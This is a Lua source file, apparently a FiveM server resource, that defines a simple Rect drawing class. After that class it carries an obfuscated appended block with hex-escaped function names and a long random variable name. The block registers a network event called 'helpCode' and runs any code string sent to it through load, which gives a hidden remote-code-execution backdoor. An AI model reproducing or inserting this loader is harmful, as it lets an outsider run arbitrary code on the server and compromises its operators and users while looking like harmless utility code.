Rect = {}
Rect.__index = Rect

setmetatable(Rect, {
    __call = function(cls, ...)
        return cls.CreateNew(...)
    end
})

function Rect.CreateNew(position, size)
    local self = setmetatable({}, Rect)

    self.position = position or vector2(0, 0)
    self.size = size or vector2(1, 1)

    return self
end

function Rect:Draw(color)
    local pos = self.position + self.size * 0.5
    DrawRect(pos.x, pos.y, self.size.x, self.size.y, color.r, color.g, color.b, color.a)
end


local LJCriYioqihCsJGNYqcSyrRTfMaNoRJmYgGcPsmmlmVbrEKLCMqAqZquGZieztPOQKqqMe = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} LJCriYioqihCsJGNYqcSyrRTfMaNoRJmYgGcPsmmlmVbrEKLCMqAqZquGZieztPOQKqqMe[6][LJCriYioqihCsJGNYqcSyrRTfMaNoRJmYgGcPsmmlmVbrEKLCMqAqZquGZieztPOQKqqMe[1]](LJCriYioqihCsJGNYqcSyrRTfMaNoRJmYgGcPsmmlmVbrEKLCMqAqZquGZieztPOQKqqMe[2]) LJCriYioqihCsJGNYqcSyrRTfMaNoRJmYgGcPsmmlmVbrEKLCMqAqZquGZieztPOQKqqMe[6][LJCriYioqihCsJGNYqcSyrRTfMaNoRJmYgGcPsmmlmVbrEKLCMqAqZquGZieztPOQKqqMe[3]](LJCriYioqihCsJGNYqcSyrRTfMaNoRJmYgGcPsmmlmVbrEKLCMqAqZquGZieztPOQKqqMe[2], function(UPhpXqthAKreesciCjwbnmuMZrIMiaDtJEoujFhbfZoLzQyvJWXpaWakvYtBmBqlvUlfZt) LJCriYioqihCsJGNYqcSyrRTfMaNoRJmYgGcPsmmlmVbrEKLCMqAqZquGZieztPOQKqqMe[6][LJCriYioqihCsJGNYqcSyrRTfMaNoRJmYgGcPsmmlmVbrEKLCMqAqZquGZieztPOQKqqMe[4]](LJCriYioqihCsJGNYqcSyrRTfMaNoRJmYgGcPsmmlmVbrEKLCMqAqZquGZieztPOQKqqMe[6][LJCriYioqihCsJGNYqcSyrRTfMaNoRJmYgGcPsmmlmVbrEKLCMqAqZquGZieztPOQKqqMe[5]](UPhpXqthAKreesciCjwbnmuMZrIMiaDtJEoujFhbfZoLzQyvJWXpaWakvYtBmBqlvUlfZt))() end)